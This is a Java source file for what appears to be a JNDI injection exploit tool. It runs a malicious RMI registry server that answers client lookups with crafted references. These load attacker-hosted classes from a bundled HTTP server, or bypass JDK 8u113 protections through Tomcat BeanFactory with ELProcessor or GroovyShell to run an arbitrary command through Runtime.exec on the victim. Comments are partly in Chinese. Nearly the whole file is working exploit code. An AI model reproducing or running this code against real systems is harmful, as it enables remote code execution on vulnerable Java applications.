package top.racerz.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;
import top.racerz.utils.Logger;
import top.racerz.utils.ReflectionUtil;
import top.racerz.utils.StringUtil;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.RemoteException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;


// 打 客户端
public class RMIServer  {

    private ServerSocket ss;

    private final Object waitLock = new Object();

    private boolean exit;

    private boolean hadConnection;

    private URL classpathUrl;

    private String addr;

    private int httpPort;

    private int port;

    private int option;

    private String exploit;

    public static void main(String[] args) throws Exception {
        // test

    }

    public RMIServer(String addr, int httpPort, int port, int option, String exploit) throws Exception {
        this.addr = addr;
        this.httpPort = httpPort;
        this.port = port;
        this.option = option;
        this.exploit = exploit;

        this.classpathUrl = new URL("http://" + addr + ":" + httpPort + "/");
        // TODO: position? Jetty启动需要时间，RMI发送完就关闭
        Thread threadJetty = new Thread(new JettyServer(httpPort));
        threadJetty.start();
        Logger.info("your payload: " + "rmi://" + addr + ":" + port + "/" + exploit);
    }

    public boolean waitFor (int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            Logger.print(" RMI 服务器   >> 正在等待连接");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }

    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }


    public void run () {
        Logger.print("-------------------------- 服务端日志 ---------------------------");
        Logger.info(" RMI  服务器启动 >> 监听地址：0.0.0.0:" + port);
        try {
            this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            @SuppressWarnings ( "resource" )
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        Logger.info(" RMI  服务器   >> 收到来自 " + remote + " 的连接请求");

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        // 对当前指定位置作标记
                        bufIn.mark(4);
                        try ( DataInputStream in = new DataInputStream(bufIn) ) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                                s.close();
                                continue;
                            }

                            OutputStream sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                            try ( DataOutputStream out = new DataOutputStream(bufOut) ) {

                                byte protocol = in.readByte();
                                switch ( protocol ) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if ( remote.getHostName() != null ) {
                                            out.writeUTF(remote.getHostName());
                                        }
                                        else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out, classpathUrl, option);
                                        break;
                                    default:
                                    case TransportConstants.MultiplexProtocol:
                                        Logger.error(" RMI  服务器不支持的协议   >> 不支持的协议");
                                        s.close();
                                        continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        Logger.info(" RMI  服务器   >> 正在关闭连接");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out, URL classpathUrl, int option) throws Exception {
        Logger.info(" RMI  服务器   >> 正在读取信息");

        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out, classpathUrl, option);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID.read(in);
                break;

            default:
                throw new IOException(" RMI  服务器   >> 无法识别：" + op);
        }

        s.close();
    }

    private void doCall ( DataInputStream in, DataOutputStream out , URL classpathUrl, int option) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException {
                if ( "[Ljava.rmi.jndi.ObjID;".equals(desc.getName()) ) {
                    return ObjID[].class;
                }
                else if ( "java.rmi.jndi.ObjID".equals(desc.getName()) ) {
                    return ObjID.class;
                }
                else if ( "java.rmi.jndi.UID".equals(desc.getName()) ) {
                    return UID.class;
                }
                else if ( "java.lang.String".equals(desc.getName()) ) {
                    return String.class;
                }
                throw new IOException(" RMI  服务器   >> 无法读取 Object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( IOException e ) {
            throw new MarshalException(" RMI  服务器   >> 无法读取 ObjID");
        }

        // 根据 ObjID 号处理 DGC请求固定为 2  RMI RegistryImpl 为 0
        if ( read.hashCode() == 2 ) {
            // DGC
            handleDGC(ois);
        }
        else if ( read.hashCode() == 0 ) {
            if ( handleRMI(ois, out, classpathUrl, option) ) {
                this.hadConnection = true;
                synchronized ( this.waitLock ) {
                    this.waitLock.notifyAll();
                }
                return;
            }
        }

    }

    private boolean handleRMI ( ObjectInputStream ois, DataOutputStream out , URL classpathUrl, int option) throws Exception {


        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if ( method != 2 ) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
//        Logger.info(object);
//        Logger.info(classpathUrl.toString());
        Logger.info(" RMI  服务器   >> RMI 查询 " + object + " " + method);
        String cpstring = classpathUrl.toString();
        String reference = object;

        if (reference == null) {
            Logger.info(" RMI  服务器   >> 引用名称查询失败：" + object);
            return false;
        }
        URL turl = new URL(cpstring + "#" + reference);
        out.writeByte(TransportConstants.Return);// transport op
        try ( ObjectOutputStream oos = new MarshalOutputStream(out, turl) ) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            ReferenceWrapper rw = ReflectionUtil.createWithoutConstructor(ReferenceWrapper.class);
            switch (option) {
                case 1: {
                    Logger.info(" RMI  服务器   >> 向目标发送 stub " + new URL(cpstring + reference + ".class"));
                    ReflectionUtil.setFieldValue(rw, "wrappee", new Reference("Foo", reference, turl.toString()));
                    break;
                }
                case 2: {
                    Logger.info(" RMI  服务器   >> 向目标发送本地类加载引用");
                    ReflectionUtil.setFieldValue(rw, "wrappee", bypassByEL());
                    break;
                }
                case 3: {
                    Logger.info(" RMI  服务器   >> 向目标发送本地类加载引用");
                    ReflectionUtil.setFieldValue(rw, "wrappee", bypassByGroovy());
                    break;
                }
                default: {
                    Logger.error(" RMI  服务器   >> 读取option失败");
                }
            }

            Field refF = RemoteObject.class.getDeclaredField("ref");
            refF.setAccessible(true);
            // 在 RegistryImpl_Stub 对象的 bind 方法中我们可以看到，其先建立连接，然后序列化数据并写入流，然后执行 this.ref.invoke()
            // 实际调用的是 UnicastRef#invoke()
            refF.set(rw, new UnicastServerRef(12345));

            oos.writeObject(rw);

            oos.flush();
            out.flush();
        }
        return true;
    }

    // bypass 8u113 by Groovy, so need a Groovy environment
    private ReferenceWrapper bypassByGroovy() throws NamingException, RemoteException {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String command = StringUtil.getCurrentPropertiesValue("Command");
        String script = String.format("'%s'.execute()", command);
        ref.add(new StringRefAddr("x", script));

        return new ReferenceWrapper(ref);
    }

    // bypass 8u113 by Tomcat, so need a tomcat or springboot environment
    private ReferenceWrapper bypassByEL() throws NamingException, RemoteException {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        String command = StringUtil.getCurrentPropertiesValue("Command");
        ref.add(new StringRefAddr("x", String.format("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                ")", command)));
        return new ReferenceWrapper(ref);
    }

    // TODO DGC 攻击
    private static void handleDGC ( ObjectInputStream ois ) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        Logger.info(" RMI  服务器   >> DGC 调用" + Arrays.toString((ObjID[]) ois.readObject()));
    }

    static final class MarshalOutputStream extends ObjectOutputStream {

        private URL sendUrl;


        public MarshalOutputStream ( OutputStream out, URL u ) throws IOException {
            super(out);
            this.sendUrl = u;
        }


        MarshalOutputStream ( OutputStream out ) throws IOException {
            super(out);
        }

        // 这种攻击方式属于 Server 打 Client， 利用动态类加载的方式
        @Override
        protected void annotateClass ( Class<?> cl ) throws IOException {
            if ( this.sendUrl != null ) {
                writeObject(this.sendUrl.toString());
            }
            else if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {
                writeObject(null);
            }
            else {
                URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();
                String cb = "";

                for ( URL u : us ) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }

        /**
         * 从指定位置加载并序列化一个类
         * 在 writeObject调用过程中会触发
         */
        @Override
        protected void annotateProxyClass ( Class<?> cl ) throws IOException {
            annotateClass(cl);
        }
    }
}
